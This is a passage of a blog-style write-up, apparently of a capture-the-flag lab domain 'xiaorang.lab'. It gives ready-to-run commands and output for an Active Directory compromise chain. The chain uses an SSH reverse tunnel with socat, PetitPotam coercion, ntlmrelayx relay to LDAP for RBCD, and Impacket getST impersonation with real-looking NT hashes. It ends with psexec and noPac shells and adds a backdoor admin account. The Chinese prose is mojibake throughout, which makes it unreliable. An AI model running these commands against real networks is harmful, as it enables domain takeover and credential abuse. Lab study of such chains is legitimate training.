<p>(è¿œç«¯æœºå™¨ä¸Šå¯èƒ½å·²ç»æœ‰ Web æœåŠ¡å™¨ç›‘å¬ 80ã€‚ç›´æ¥ç”¨ <code>ssh -R</code> è¯·æ±‚ç»‘å®š 80 ä¼šå¤±è´¥æˆ–è¦†ç›–/å†²çªï¼ˆä¸å¯æ¥å—ï¼‰ã€‚ç”¨ socat/iptables å¯ä»¥æ›´çµæ´»åœ°è½¬å‘/é€‰æ‹©ç«¯å£ã€‚)(æˆ‘çŒœçš„ï¼Œå› ä¸ºæˆ‘ä»¬ç›®æ ‡éœ€è¦ HTTPï¼ˆ80ï¼‰è®¿é—®)</p>
<blockquote>
<ul>
<li><code>ssh</code>ï¼šSSH <strong>å®¢æˆ·ç«¯</strong> ç¨‹åºã€‚ä½ åœ¨æœ¬åœ°è¿è¡Œå®ƒå»è¿æ¥è¿œç«¯ SSH æœåŠ¡ï¼Œæä¾› <code>-R</code>ã€<code>-D</code> ç­‰éš§é“å‚æ•°ã€‚</li>
<li><code>sshd</code>ï¼šSSH <strong>æœåŠ¡ç«¯ï¼ˆdaemonï¼‰</strong>ï¼Œè·‘åœ¨è¿œç«¯ï¼ˆæ¯”å¦‚ <code>39.99.132.128</code>ï¼‰ï¼Œè´Ÿè´£æ¥å—è¿æ¥å¹¶å¤„ç†è¿œç«¯è½¬å‘è¯·æ±‚ï¼ˆæ˜¯å¦å…è®¸ç”±å…¶é…ç½®å†³å®šï¼‰ã€‚</li>
</ul>
<p>åŒºåˆ«ï¼š<code>ssh</code> å‘èµ·è¿æ¥å¹¶åˆ›å»ºéš§é“ï¼›<code>sshd</code> æ¥æ”¶è¿æ¥å¹¶åœ¨æœåŠ¡å™¨ç«¯å»ºç«‹ç›‘å¬/è½¬å‘ã€‚</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@39.99.132.128 -D 0.0.0.0:1081 -R *:79:127.0.0.1:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">ssh -i ~/.ssh/id_rsa root@39.99.132.128  -D 127.0.0.1:1082 -R \*:79:127.0.0.1:80
nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:127.0.0.1:79 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@39.99.132.128 -D SOCKSä»£ç†IP:PORT -R \*:79:127.0.0.1:80
nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;

ssh -i id_rsa root@39.99.132.128 -D 127.0.0.1:12345 -R \*:79:127.0.0.1:80
nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@39.99.132.128 -D 0.0.0.0:1081 -R *:79:127.0.0.1:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><code>-i id_rsa</code>ï¼šç”¨è¿™ä¸ªç§é’¥ç™»å½•ã€‚</li>
<li><code>-D 0.0.0.0:1081</code>ï¼šåœ¨æœ¬åœ°å»ºç«‹ä¸€ä¸ª SOCKS ä»£ç†ï¼ˆç›‘å¬æ‰€æœ‰æ¥å£ï¼‰ã€‚</li>
<li><code>-R *:79:127.0.0.1:80</code>ï¼šè¯·æ±‚åœ¨è¿œç«¯ç›‘å¬ <code>*:79</code>ï¼ˆå…¨æ¥å£ï¼‰ï¼ŒæŠŠè¿æ¥è½¬åˆ°å®¢æˆ·ç«¯çš„ <code>127.0.0.1:80</code>ã€‚æ˜¯å¦çœŸçš„åœ¨ <code>*</code> ä¸Šç›‘å¬å–å†³äºè¿œç«¯ <code>sshd_config</code>ï¼ˆ<code>GatewayPorts</code>ï¼‰ã€‚</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">ssh -i ~/.ssh/id_rsa root@39.99.132.128 -D 127.0.0.1:1082 -R \*:79:127.0.0.1:80`
 `nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:127.0.0.1:79 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li><code>-D 127.0.0.1:1082</code>ï¼šåªåœ¨æœ¬åœ°å›ç¯æä¾› SOCKSï¼ˆæ›´å®‰å…¨ï¼‰ã€‚</li>
<li><code>socat</code>ï¼šæŠŠè¿œç«¯çš„å¤–ç½‘å£ 80 è½¬å‘åˆ°å›ç¯ 79ï¼Œè®© ssh -Rï¼ˆç›‘å¬å›ç¯79ï¼‰èƒ½æ¥åˆ°å¤–éƒ¨çš„è¿æ¥ã€‚<code>nohup &amp;</code> æ˜¯åå°è¿è¡Œã€‚</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@39.99.132.128 -D SOCKSä»£ç†IP:PORT -R \*:79:127.0.0.1:80` + `socat ...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>æœ¬è´¨åŒä¸Šï¼šåªæ˜¯ <code>-D</code> çš„å†™æ³•å˜ä½“ï¼ˆSOCKS å¯ç»‘åœ¨æŸä¸ªåœ°å€/ç«¯å£ï¼‰ã€‚</li>
</ul>
</blockquote>
<p>åœ¨è¿œç¨‹æœºä¸Š<code>curl 172.22.11.76</code>ï¼Œæœ¬åœ°<code>nc -lvvp 80</code>ï¼Œå¯ä»¥å¬åˆ°</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7a9b96eccded107029009750d2939cfc.png"></p>
<pre class="line-numbers language-none"><code class="language-none">proxychains curl http://172.22.11.76:80
å¯ä»¥çœ‹åˆ°æˆåŠŸ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/aeec574dc1d17d289b47f9f2482874be.png"></p>
<blockquote>
<p>å‡è®¾ä½ åœ¨æœ¬åœ°ï¼ˆAï¼‰ï¼Œè¿œç«¯è·³æ¿æ˜¯ Bï¼Œç›®æ ‡/è®¿é—®è€…æ˜¯ Cï¼ˆæ¯”å¦‚å†…ç½‘ä¸»æœºä¼šè¯·æ±‚ B:80ï¼‰ã€‚</p>
<ol>
<li>ä½ åœ¨ A ä¸Šè¿è¡Œï¼š<br> <code>ssh -i id_rsa root@B -R 79:127.0.0.1:80</code><br> â†’ è¿™ä¼šè®© B ä¸Šçš„å›ç¯åœ°å€ <code>127.0.0.1:79</code> è¢« SSH éš§é“ç›‘å¬ï¼Œä»»ä½•åˆ° 127.0.0.1:79 çš„è¿æ¥éƒ½ä¼šè¢«åå‘è½¬å‘å› A çš„ <code>127.0.0.1:80</code>ï¼ˆæˆ–ä½ æŒ‡å®šçš„æœ¬åœ°ç«¯å£ï¼‰ã€‚</li>
<li>å¦‚æœ C è®¿é—® B çš„ <code>0.0.0.0:80</code>ï¼ˆä¾‹å¦‚ <code>curl http://B</code>ï¼‰ï¼Œä½† <code>sshd</code> åªç›‘å¬å›ç¯ï¼ˆ127.0.0.1ï¼‰ã€ç”±äºSSHçš„åå‘ç«¯å£åœ¨è½¬å‘ç›‘å¬çš„æ—¶å€™åªä¼šç›‘å¬127.0.0.1ï¼Œå³ä½¿åå‘åœ¨è½¬å‘79ç«¯å£æŒ‡å®šç›‘å¬å…¨éƒ¨ï¼Œç«¯å£79ä»ç»‘å®šåœ¨<code>127.0.0.1</code>ã€‚ã€‘</li>
<li>ï¼Œé‚£ä¹ˆç›´æ¥è®¿é—® B:80 å¹¶ä¸ä¼šèµ°åˆ° 127.0.0.1:79ã€‚<br> â†’ å› æ­¤åœ¨ B ä¸Šå¯åŠ¨ <code>socat</code>ï¼š<br> <code>socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:127.0.0.1:79 &amp;</code><br> è¿™ä¼šæŠŠå¤–éƒ¨åˆ° B:80 çš„è¿æ¥è½¬å‘åˆ° B æœ¬åœ°çš„ 127.0.0.1:79ã€‚</li>
<li>socat æŠŠè¿æ¥é€åˆ° 127.0.0.1:79ï¼ŒSSHd çš„åå‘éš§é“æ¥æ”¶åˆ°å®ƒï¼Œç„¶åæŠŠæµé‡é€šè¿‡ SSH éš§é“é€å› Aï¼ˆæœ¬åœ°ï¼‰ï¼ŒA ä¸Šçš„ <code>nc -l 80</code> æˆ–ä½ çš„æœ¬åœ°æœåŠ¡å°±èƒ½æ”¶åˆ°è¯·æ±‚ã€‚</li>
</ol>
<p>ç®€çŸ­è·¯å¾„ï¼š C â†’ (B:80 via socat) â†’ B:127.0.0.1:79 â†’ SSH éš§é“ â†’ A:127.0.0.1:80</p>
<p>è¿œç«¯å†…ç½‘çš„ä»»æ„ä¸»æœºè®¿é—® <code>http://&lt;è¿œç«¯-ip&gt;:80</code>ï¼ˆ <code>curl 172.22.11.76</code>ï¼‰ã€‚</p>
<p><code>socat</code>ï¼ˆåœ¨è¿œç«¯ï¼‰ç›‘å¬åˆ°æ¥è‡ª <code>0.0.0.0:80</code> çš„è¿æ¥ï¼ŒæŠŠè¿æ¥è½¬å‘åˆ° <code>127.0.0.1:79</code>ï¼ˆè¿œç«¯æœ¬åœ°å›ç¯ï¼‰ã€‚</p>
<p>SSHd ä¸Š <code>-R</code> åˆ›å»ºçš„è¿œç«¯ç›‘å¬ï¼ˆåœ¨ <code>127.0.0.1:79</code>ï¼‰æ¥æ”¶è¿™ä¸ªè¿æ¥ï¼Œå¹¶é€šè¿‡ SSH éš§é“æŠŠæµé‡åå‘ä¼ å› SSH å®¢æˆ·ç«¯ï¼ˆä½ æœºå™¨ï¼‰ã€‚</p>
<p>SSH å®¢æˆ·ç«¯ä¸Šçš„ SSH æŠŠè¿™æµé‡äº¤ç»™å®ƒä¸º <code>-R</code> æŒ‡å®šçš„ç›®æ ‡ï¼ˆé€šå¸¸æ˜¯ <code>127.0.0.1:80</code> â€”â€” ä½ æœ¬åœ°çš„ 80ï¼‰ã€‚</p>
<p>å› æ­¤ä½ åœ¨æœ¬åœ°çš„ <code>nc -lvvp 80</code> ä¼šçœ‹åˆ°æ¥è‡ªè¿œç«¯ <code>curl</code> çš„è¯·æ±‚è¿æ¥/æ•°æ®ã€‚</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">1ã€ç”¨petitpotamè§¦å‘ç›®æ ‡è®¿é—®HTTPæœåŠ¡
2ã€ç›®æ ‡ä½¿ç”¨webclientæºå¸¦NTLMè®¤è¯è®¿é—®ä¸­ç»§ï¼Œå¹¶å°†NTLMè®¤è¯ä¸­ç»§åˆ°LDAP
3ã€è·å–åˆ°æœºå™¨è´¦å·èº«ä»½
4ã€ä»¥æœºå™¨è´¦æˆ·çš„èº«ä»½ä¿®æ”¹å…¶è‡ªèº«çš„msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§ï¼Œä»è€Œå…è®¸æˆ‘ä»¬è®¿é—®åˆ°ç›®æ ‡æœºå™¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>å’±ä»¬å·²æœ‰ä¸€ä¸ªâ€œæ¶æ„æœºå™¨è´¦æˆ·â€ XR-Desktop$ï¼ˆæœºå™¨å¸æˆ·åä»¥ $ ç»“å°¾ï¼‰ï¼Œå¹¶ä¸”é€šè¿‡ ntlmrelayx çš„æŸäº›åŠŸèƒ½å·²ç»ç”¨æ¥ <strong>æŠŠè¯¥æœºå™¨è´¦æˆ·å†™å…¥ç›®æ ‡æœºå™¨çš„ msDS-AllowedToActOnBehalfOfOtherIdentity</strong>ï¼ˆå³å®Œæˆ RBCD è®¾ç½®ï¼‰ã€‚è¿™ä¸€æ­¥çš„ç»†èŠ‚ä½“ç°åœ¨ ntlmrelayx çš„ <code>--escalate-user 'xr-desktop$' --delegate-access</code> é€‰é¡¹â€”â€”ä¸‹é¢ä¼šè¯´æ˜ã€‚</p>
<p>æ¥ç€æœ¬åœ°å¼€å¯å¼€å¯ntlmrelayxï¼Œåˆ©ç”¨å‰é¢æ‹¿ä¸‹çš„XR-Desktopä½œä¸ºæ¶æ„æœºå™¨è´¦æˆ·è®¾ç½®RBCDï¼Œæ¥ç€ä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">Petitpotam</a>è§¦å‘XR-LCM3AE8Bè®¤è¯åˆ°172.22.11.76</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains python3 PetitPotam.py -u yangmei -p 'xrihGHgoNZQ' -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>ä½œç”¨</strong>ï¼šå‘ <code>172.22.11.26</code>ï¼ˆæœ‰ PetitPotam æ¼æ´çš„é‚£å°ï¼‰å‘é€è¯·æ±‚ï¼Œå‘Šè¯‰å®ƒâ€œå»è®¿é—® <code>http://ubuntu@80/pwn.txt</code>â€ï¼ˆä¹Ÿå°±æ˜¯ä½ æ§åˆ¶çš„ HTTP æœåŠ¡åœ°å€ï¼‰ã€‚</p>
<p><strong>ç»“æœ</strong>ï¼šç›®æ ‡ä¸»æœºçš„ WebClientï¼ˆæˆ–ç›¸åº”æœåŠ¡ï¼‰ä¼šå¯¹è¯¥ URL å‘èµ· <strong>NTLM</strong>ï¼ˆæˆ– NTLMv2ï¼‰è®¤è¯è¯·æ±‚ï¼Œå¹¶æŠŠ NTLM challenge/response å‘ç»™ä½ è¿è¡Œçš„ HTTP æœåŠ¡å™¨ï¼ˆä¹Ÿå°±æ˜¯ä½ çš„ä¸­ç»§/æ¥æ”¶ç«¯ï¼‰ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆèƒ½ç”¨</strong>ï¼šWindows çš„æŸäº› RPC/æ¥å£èƒ½è¢«è¿œç¨‹å‘½ä»¤è§¦å‘ï¼Œè®©ç›®æ ‡â€œä¸»åŠ¨å»è®¤è¯â€åˆ°ä¸€ä¸ªæŒ‡å®šçš„ URLï¼ˆè¿™å°±æ˜¯ PetitPotam çš„è¦ç‚¹ï¼š<strong>å¼ºåˆ¶è®¤è¯ / Coerce authentication</strong>ï¼‰ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains python3 ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user 'xr-desktop$' --delegate-access <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><strong>ä½œç”¨</strong>ï¼šå¯åŠ¨ ntlmrelayxï¼Œæ¥æ”¶æ¥è‡ªç›®æ ‡æœºå™¨ï¼ˆè¢« PetitPotam å¼ºåˆ¶å‘å‡ºçš„ï¼‰NTLM è®¤è¯ï¼Œç„¶åæŠŠè¿™ä¸ªè®¤è¯<strong>è½¬å‘ï¼ˆrelayï¼‰åˆ° LDAPï¼ˆåŸŸæ§ 172.22.11.6ï¼‰</strong>ã€‚</li>
<li><strong>é‡è¦å‚æ•°å«ä¹‰</strong>ï¼š<ul>
<li><code>-t ldap://172.22.11.6</code>ï¼šæŠŠæ”¶åˆ°çš„ NTLM auth ä¸­ç»§åˆ° LDAP æœåŠ¡ï¼ˆåŸŸæ§ï¼‰ã€‚</li>
<li><code>--escalate-user 'xr-desktop$'</code>ï¼šå‘Šè¯‰ ntlmrelayxï¼Œç”¨ä¸­ç»§çš„å‡­è¯å»æŠŠ <strong>xr-desktop$</strong> è¿™ä¸ªæœºå™¨è´¦å·â€œå‡çº§/å†™å…¥/è®¾ç½®â€æˆèƒ½åšå§”æ‰˜çš„å¯¹è±¡ï¼ˆæ¯”å¦‚æŠŠå®ƒåŠ åˆ°ç›®æ ‡æœºå™¨çš„ <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>ï¼‰ã€‚</li>
<li><code>--delegate-access</code>ï¼šæŒ‡ç¤º ntlmrelayx å°è¯•ä½¿ç”¨â€œå§”æ‰˜/è®¿é—®ç›¸å…³â€çš„å†™æ“ä½œï¼ˆä¾‹å¦‚è®¾ç½® RBCDï¼‰ã€‚</li>
<li><code>--no-dump --no-da --no-acl</code>ï¼šå…³é—­æŸäº›è‡ªåŠ¨æšä¸¾/å¯¼å‡ºè¡Œä¸ºï¼Œåªåšæˆ‘ä»¬éœ€è¦çš„ä¸­ç»§/å†™å…¥ã€‚</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆæœ‰æ•ˆ</strong>ï¼šNTLM relay åˆ° LDAPï¼Œè‹¥ä¸­ç»§æ—¶ä½¿ç”¨çš„èº«ä»½æœ‰è¶³å¤Ÿæƒé™ï¼ˆæˆ–ä½ ä¸­ç»§çš„å¯¹è±¡æ˜¯æœºå™¨è´¦æˆ·ä¸”æŸäº›æƒé™è¢«æ»¥ç”¨ï¼‰ï¼Œå°±èƒ½å†™å…¥è®¡ç®—æœºå¯¹è±¡å±æ€§ï¼ˆåŒ…æ‹¬ <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>ï¼‰æˆ–è€…ä»¥æœºå™¨è´¦æˆ·èº«ä»½åšå…¶ä»–æ‰©å±•æ“ä½œã€‚</li>
</ul>
<blockquote>
<p>äº§å‡ºï¼šä½ æˆåŠŸ<strong>ç”¨ä¸­ç»§çš„ NTLM å‡­è¯</strong>ï¼Œä»¥ <code>xr-desktop$</code> çš„åä¹‰åœ¨åŸŸæ§/LDAP ä¸Šæ‰§è¡Œä¿®æ”¹ï¼Œä»è€ŒæŠŠ <code>xr-desktop$</code> åˆ—ä¸ºè¢«å…è®¸åšæŸæœºå™¨çš„â€œä»£è¡¨è€…â€ï¼ˆä¹Ÿå¯èƒ½æ˜¯æŠŠ <code>xr-desktop$</code> å†™å…¥æŸç›®æ ‡çš„ AllowedToAct åˆ—è¡¨ï¼‰ã€‚è¿™å®Œæˆäº†â€œæŠŠæ¶æ„æœºå™¨åŠ å…¥ç›®æ ‡çš„ RBCDâ€è¿™ä¸€é‡è¦å‰æ</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e8b897dfc22ae024c0c3a6ab52c7cca7.png"></p>
<p>å¯ä»¥é€šè¿‡S4Uæ‰©å±•åè®®æ¥ç”³è¯·è®¿é—®WebDavç›®æ ‡æœºçš„STç¥¨æ®äº†ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :738dcc0171b84e1a36400008983a3e10  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.11.6:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.11.6:88  ...  OK
[*] Impersonating administrator
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.11.6:88  ...  OK
[*] Requesting S4U2Proxy
[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.11.6:88  ...  OK
[*] Saving ticket in administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccache
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p><strong>è¿™ä¸€æ­¥åœ¨åšä»€ä¹ˆï¼ˆåˆ†ä¸¤éƒ¨åˆ†ï¼‰</strong>ï¼š</p>
<ol>
<li><code>-hashes :738d...</code>ï¼šå’±ä»¬ä¹‹å‰æ‹¿åˆ°çš„ <code>xr-desktop$</code> çš„ NT hash</li>
<li><code>-impersonate administrator</code>ï¼šå°è¯•é€šè¿‡ S4U2Self/S4U2Proxy çš„æµç¨‹ï¼Œä»¥ <code>administrator</code> èº«ä»½æ¥ä¸º <code>cifs/XR-LCM3AE8B.xiaorang.lab</code> ç”³è¯·æœåŠ¡ç¥¨ï¼ˆSPNï¼‰ã€‚</li>
<li><code>-spn cifs/XR-LCM3AE8B.xiaorang.lab</code>ï¼šç”³è¯·é’ˆå¯¹ CIFSï¼ˆSMB / file serviceï¼‰çš„æœåŠ¡ç¥¨ï¼Œè¿™æ˜¯ psexec/SMB è¿œç¨‹æ‰§è¡Œå¸¸ç”¨çš„ SPNã€‚</li>
</ol>
</li>
<li><p><strong>ä¸ºä»€ä¹ˆèƒ½æ‹¿åˆ°ç¥¨æ®</strong>ï¼šå› ä¸ºä½ ä¹‹å‰å·²ç»æŠŠ <code>xr-desktop$</code> å†™è¿›äº†ç›®æ ‡æœºå™¨ <code>XR-LCM3AE8B</code> çš„ <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>ï¼ˆRBCDï¼‰ï¼Œæ‰€ä»¥åŸŸæ§ä¼šå…è®¸ <code>xr-desktop$</code> ä½œä¸ºè¢«æˆäºˆçš„ä»£ç†å»ä¸º admin è¯·æ±‚åˆ°ç›®æ ‡ä¸»æœºçš„æœåŠ¡ç¥¨ï¼ˆé€šè¿‡ S4U æµç¨‹ï¼‰ã€‚</p>
</li>
<li><p><strong>å‘½ä»¤è¾“å‡º</strong>ï¼šå®ƒä¼šæŠŠæ‹¿åˆ°çš„ç¥¨æ®ï¼ˆccacheï¼‰ä¿å­˜ä¸ºæ–‡ä»¶ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¿™è¡¨ç¤ºâ€œä»¥ administrator çš„èº«ä»½ï¼Œä½†ç”¨äº cifs/XR-LCM3AE8B çš„ç¥¨æ®â€å·²æˆåŠŸè·å–å¹¶ä¿å­˜ã€‚</p>
</li>
</ul>
<p>å°†ç”³è¯·åˆ°çš„ç¥¨æ®åŠ è½½åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œä½¿ç”¨psexecç™»é™†è¿œç¨‹æœåŠ¡å™¨ï¼Œå³å¯æ— å¯†ç è¿æ¥ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">export KRB5CCNAME=~/administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccache
sudo vim /etc/hosts
#å¡«å…¥å†…å®¹å¦‚ä¸‹
172.22.11.26 XR-LCM3AE8B.xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>ä¸ºä»€ä¹ˆè¦ä¿®æ”¹ /etc/hosts</strong>ï¼š<code>impacket-getST</code> å’Œ psexec ä¼šå°è¯•æŠŠ SPN åç§°è§£æåˆ° IP åœ°å€ã€‚ä½ é€šè¿‡åœ¨ <code>/etc/hosts</code> ä¸­æŠŠ <code>XR-LCM3AE8B.xiaorang.lab</code> æ˜ å°„åˆ° <code>172.22.11.26</code>ï¼Œç¡®ä¿å®¢æˆ·ç«¯åœ¨åš Kerberos æˆ– SMB è¿æ¥æ—¶ä¼šå°†ç›®æ ‡ä¸»æœºè§£æåˆ°æ­£ç¡®çš„ IPï¼ˆå¹¶ä¸” SPN ä¸ä¸»æœºåä¸€è‡´ï¼Œé¿å… Kerberos/SMB ä¸»æœºåä¸åŒ¹é…å¯¼è‡´ç¥¨æ®æ— æ•ˆï¼‰ã€‚ä½†å…¶å®ä¸å¼„ä¹Ÿèƒ½æˆåŠŸï¼Œluckyï¼Œä½†è¿˜æ˜¯å¼„ä¸Šã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>-k -no-pass</code>ï¼šè¡¨ç¤ºä½¿ç”¨ Kerberos è®¤è¯å¹¶ä¸”ä¸æä¾›æ˜æ–‡å¯†ç ï¼ˆä½¿ç”¨ä½ ç¯å¢ƒå˜é‡ <code>KRB5CCNAME</code> æŒ‡å‘çš„ ccacheï¼‰ã€‚å› è€Œ psexec ä¼šç”¨ä½ å·²ç»è·å¾—å¹¶è½½å…¥çš„ Kerberos ç¥¨æ®å»å¯¹ç›®æ ‡ SMB æœåŠ¡è¿›è¡Œè®¤è¯å¹¶æ‰§è¡Œå‘½ä»¤ã€è½åœ° shellã€‚</p>
<p><code>-target-ip</code>ï¼šæ˜ç¡®ä½¿ç”¨ IP æ¥è¿æ¥ç›®æ ‡ SMBï¼ˆé¿å… DNS/NetBIOS çš„æ­§ä¹‰ï¼‰ã€‚</p>
<p><code>-codec gbk</code>ï¼šæ§åˆ¶ç¼–ç ï¼ˆé’ˆå¯¹ä¸­æ–‡è¾“å‡ºï¼‰ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/eb47c8c67ae7d5b6219d2c99cc9b42af.png"></p>
<hr>
<h3 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h3><p>æ·»ä¸€ä¸ªç®¡ç†å‘˜è´¦å·</p>
<pre class="line-numbers language-none"><code class="language-none">net user tesq Abcd1234 /add
net localgroup administrators tesq /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>è¿œç¨‹æ¡Œé¢è¿ä¸Šç”¨çŒ•çŒ´æ¡ƒæ‹¿ä¸€ä¸‹NTMLï¼Œè€Œ<code>zhanghui</code>æ‰€å±çš„ MA_Admin ç»„å…·å¤‡æ·»åŠ æœºå™¨è´¦æˆ·çš„å…³é”®æƒé™ï¼ˆ<strong>èƒ½æ·»åŠ /ä¿®æ”¹è®¡ç®—æœºå¯¹è±¡çš„æ™®é€šç”¨æˆ·åœ¨æŸäº› AD ç¯å¢ƒä¸‹å¯è¢«æ»¥ç”¨</strong>ã€‚ï¼‰ï¼Œç”¨ noPac </p>
<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">Ridter/noPac: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user</a></p>
<pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/Ridter/noPac.git
cd noPac

proxychains python3 noPac.py xiaorang.lab/zhanghui -hashes ':1232126b24cdf8c9bd2f788a9d7c7ed1' -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell

type C:\Users\Administrator\flag\flag04.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8266f3aeb2bd81411bf7b9f67c5ddd3d.png"></p>
<p>æˆ–è€…XR-DESKTOP$ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¯•ç«Ÿå®ƒæœ¬æ¥å°±æ˜¯æœºå™¨è´¦æˆ·ï¼Œä¸ç”¨åˆ›å»ºäº†</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains python3 noPac.py xiaorang.lab/'XR-DESKTOP$' -hashes ':03e8d17f4da1797f6b69a9a7a23244c1' -dc-ip 172.22.11.6 --impersonate Administrator -no-add -target-name 'XR-DESKTOP$' -old-hash ':6f558f06e563b300dc9f5884aca659f3' -use-ldap -shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        æ–‡ç« ä½œè€…:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        æ–‡ç« é“¾æ¥:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://lingqing777.github.io/2025/09/28/spoofing/">https://lingqing777.github.io/2025/09/28/spoofing/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        ç‰ˆæƒå£°æ˜:
                    </i>
                </span>
                <span class="reprint-info">
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ¥å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº
                    <a href="/about" target="_blank">q1n9</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>å¤åˆ¶æˆåŠŸï¼Œè¯·éµå¾ªæœ¬æ–‡çš„è½¬è½½è§„åˆ™</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">æŸ¥çœ‹</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
